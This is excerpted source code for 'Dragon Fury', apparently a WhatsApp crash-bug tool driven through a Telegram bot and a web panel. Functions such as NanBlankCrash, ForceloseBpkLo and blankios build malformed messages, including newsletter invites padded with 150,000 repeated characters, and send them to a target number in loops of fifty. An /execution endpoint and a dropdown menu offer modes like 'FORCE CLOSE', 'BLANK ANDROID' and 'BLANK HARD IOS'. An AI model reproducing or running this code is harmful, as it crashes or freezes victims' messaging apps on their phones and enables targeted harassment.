...
bot.command("start", async (ctx) => {
  ...
  const ambilFoto = 'https://g.top4top.io/p_3645mp9uy1.jpg';
  ...
  await ctx.replyWithPhoto(ambilFoto, {
    caption: `<blockquote><b>Dragon Fury</b></blockquote>\nWelcome, @${username}\n\n<blockquote><a href="https://t.me/ZyrlXit">𝐒𝐢𝐗 ☊ 𝐕𝐞𝐫𝐬𝐢𝐨𝐧</a></blockquote>`,
    parse_mode: 'HTML',
    ...Markup.inlineKeyboard([
      [
        Markup.button.url('ϟ', 'https://t.me/ZyrlXit'),
        Markup.button.url('🍷', 'https://whatsapp.com/channel/0029VbAr6sk6GcG7ja7yGD3a'),
      ]
    ])
  });
...
// FUNCTION BLANK
async function StickerInvis(sock, target, mention) {
...
async function NanBlankCrash(sock, target) {
    try {
        const messsage = {
            botInvokeMessage: {
                message: {
                    newsletterAdminInviteMessage: {
                        ...
                        newsletterName: "(🍁) Nando Is Back?" + "ી".repeat(150000),
                        jpegThumbnail: "",
                        caption: "(🍁) Nando Is Back?" + "ી".repeat(150000),
...
async function ForceloseBpkLo(sock, target){
...
await sock.sendMessage(
  target,
  {
    ...
    buttons: [
      {
        buttonId: ".",
        buttonText: { displayText: "Dragon Fury" },
        type: 4,
        nativeFlowInfo: {
          name: "single_select",
...
// INI BUAT BUTTON CRASH CLICK
async function crashclik(sock, target) {
     for (let i = 0; i < 50; i++) {
         await blankButton(sock, target);
         await sleep(500),
         await protocolbug19(sock, target);
...
// INI BUAT BUTTON BLANK ANDROID
async function androblank(sock, target) {
     for (let i = 0; i < 50; i++) {
         await blankButton(sock, target);
         await sleep(500),
         await protocolbug19(sock, target);
...
async function blankios(sock, target) {
     for (let i = 0; i < 50; i++) {
         await NanBlankCrash(sock, target);
         await sleep(500),
         await blankButton(sock, target);
         }
     console.log(chalk.green(`👀 Success Send Bugs to ${target}`));
...
async function forklos(sock, target) {
     for (let i = 0; i < 50; i++) {
         await ForceloseBpkLo(sock, target);
         await sleep(500),
         await protocolbug19(sock, target);
         }
     console.log(chalk.green(`👀 Success Send Bugs to ${target}`));
...
//BUTTON BUG FORCE ONE MSG
async function forceone(sock, target) {
     for (let i = 0; i < 50; i++) {
         await ForceloseBpkLo(sock, target);
         await sleep(500),
         await protocolbug19(sock, target);
...
app.post("/execution", requireAuth, async (req, res) => {
  try {
    ...
    const validModes = ["crashAndroid", "invisDelay", "forceClose", "blankhard", "forceone", "androblank", "crashclik", "delaylow"];
    ...
    try {
      ...
      if (mode === "crashAndroid") {
        ...
        bugName = "INFISIBLE DELAY";
        bugResult = await delaylow(sock, 24, targetJid);
      } else if (mode === "forceClose") {
        bugName = "FORCE CLOSE";
        bugResult = await forklos(sock, targetJid);
      } else if (mode === "invisDelay") {
        bugName = "INFINITY FORCE CLOSE";
        bugResult = await delaylow(sock, targetJid);
      } else if (mode === "blankhard") {
        bugName = "BLANK HARD IOS";
        bugResult = await blankios(sock, targetJid);
      } else if (mode === "forceone") {
        bugName = " FORCE CLOSE ONE MSG";
        bugResult = await forceone(sock, targetJid);
        } else if (mode === "crashclik") {
        bugName = "CRASH CLICK";
        bugResult = await crashclik(sock, targetJid);
        } else if (mode === "forceClose") {
        bugName = "FORCE CLOSE";
        bugResult = await forklos(sock, targetJid);
        } else if (mode === "delaylow") {
        bugName = "DELAY FISIBLE HARD";
        bugResult = await delaylow(sock, targetJid);
       } else if (mode === "androblank") {
        bugName = "BLANK ANDROID";
        bugResult = await androblank(sock, targetJid);
      }
...
<i>Powered by Dragon Fury • Phone Helper Detection</i>`;
...
function startIntro() {
    ...
    figlet('Indictive', { font: 'Standard' }, (err, data) => {
        ...
        // 2. Data Info Bot
        const ownerName = 'ZyrlXit';
        const ownerCnl = ['@Zyrlxt'];
        const infoText = `
Author    : ${ownerName}
Version   : 6.0.0
...
Status    : Active
        ...
        const spinner = ora({
            text: 'Initializing Dragon Fury modules...',
            spinner: {
                interval: 80,
                frames: ['⏤    ', ' ⏤⏤   ', '  ⏤⏤⏤ ', '   ⏤⏤⏤', '    ⏤⏤', '     ⏤']
            }
        ...
        setTimeout(() => {
            spinner.succeed(chalk.yellow('System ready. Dragon Fury is now online!'));
...
<head>
    ...
    <title>Dragon Fury - Execution</title>
    ...
    <style>
        ...
        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; outline: none; }
        ...
        .sidebar-header {
            height: 180px;
            width: 100%;
            background-image: url('https://a.top4top.io/p_3668c6eib0.jpg'); 
        ...
        <ul class="sidebar-menu">
            ...
            <div class="sidebar-credits">
                ...
                <div class="credit-item">
                    <span>@ZyrlXit</span> - My Chanel WhatsApp
                </div>
                <div class="credit-item">
                    <span>@ZyrlCrash</span> - Real Developer
                </div>
            </div>
        </ul>
    ...
    <div class="container">
        <header>
            <div class="header-left">
                ...
                <h1 class="brand-title">Dragon Fury</h1>
            </div>
        </header>
        ...
        <main>
            <div class="user-card">
                <div class="user-card-content">
                    <div class="profile-photo">
                        <img src="https://g.top4top.io/p_3645mp9uy1.jpg" alt="Profile">
                    </div>
            ...
            <!-- BANNER -->
            <div class="banner">
                <img src="https://g.top4top.io/p_3645mp9uy1.jpg">
                    ...
                    <div class="input-body">
                        ...
                        <div class="custom-dropdown" id="bugDropdown">
                            ...
                            <div class="dropdown-options" id="dropdownOptions">
                                ...
                                <div 
 class="dropdown-option" data-value="forceClose">
                                    <span class="option-icon"><i class="fa-solid fa-skull"></i></span>
                                    <span>FORCE CLOSE</span>
                                </div>
                                <div 
 class="dropdown-option" data-value="invisDelay">
                                    <span class="option-icon"><i class="fa-solid fa-clock"></i></span>
                                    <span>"INFISIBLE DELAY</span>
                                </div>
                                <div class="dropdown-option" data-value="forceClose">
                                    <span class="option-icon"><i class="fa-solid fa-skull"></i></span>
                                    <span>FORCE CLOSE ONE MSG</span>
                                </div>
                                <div
  class="dropdown-option" data-value="invisDelay">
                                    <span class="option-icon"><i class="fa-solid fa-skull"></i></span>
                                    <span>"INFINITY FORCE CLOSE</span>
                                </div>
                                <div 
 class="dropdown-option" data-value="androblank">
                                    <span class="option-icon"><i class="fa-solid fa-android"></i></span>
                                    <span>BLANK ANDROID</span>
                                </div>
                                <div
 class="dropdown-option" data-value="crashclik">
                                    <span class="option-icon"><i class="fa-solid fa-android"></i></span>
                                    <span>CRASH CLICK</span>
                                </div>
                                <div
 class="dropdown-option" data-value="delaylow">
                                    <span class="option-icon"><i class="fa-solid fa-android"></i></span>
                                    <span>DELAY FISIBLE HARD</span>
                                </div>
                                <div 
 class="dropdown-option" data-value="blankhard">
                                    <span class="option-icon"><i class="fa-brands fa-apple"></i></span>
                                    <span>BLANK HARD IOS</span>
                                </div>
                            </div>
                        </div>
